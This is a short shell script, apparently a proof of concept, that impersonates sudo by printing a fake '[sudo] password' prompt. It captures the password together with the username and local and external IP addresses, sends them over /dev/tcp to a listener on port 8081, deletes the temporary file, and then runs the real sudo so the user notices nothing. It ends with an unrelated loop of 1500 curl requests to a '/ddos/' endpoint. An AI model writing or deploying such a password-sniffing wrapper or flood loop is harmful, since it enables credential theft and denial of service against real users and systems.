#!/bin/sh

currentDir=$(pwd)

# alias sudo="bash $currentDir/sudo.sh"
# unalias sudo

read -sp "[sudo] password for $USER: " password

localaddress=$(hostname --all-ip-addresses)
externaladdress=$(dig +short myip.opendns.com @resolver1.opendns.com)

echo "$externaladdress :: $localaddress :: $USER :: $password" > "$currentDir/${USER}_sudo_pass.txt"

cat "$currentDir/${USER}_sudo_pass.txt" > /dev/tcp/127.0.0.1/8081
# nc -l -p 8081

rm -rf "$currentDir/${USER}_sudo_pass.txt"
# shred -u -z -f "$currentDir/${USER}_sudo_pass.txt"

echo ""

params=""
for a in "$@"
do
    if [[ "$params" != "" ]]
    then
        params+=" "
    fi
    params+="$a"
done

echo $password | sudo -S echo >/dev/null 2>&1
sudo -S $params

## mitigation https://superuser.com/questions/793240/preventing-malware-from-sniffing-the-sudo-password

for i in `seq 1 1500`; do curl http://localhost:8079/ddos/someservice/verylazy; done
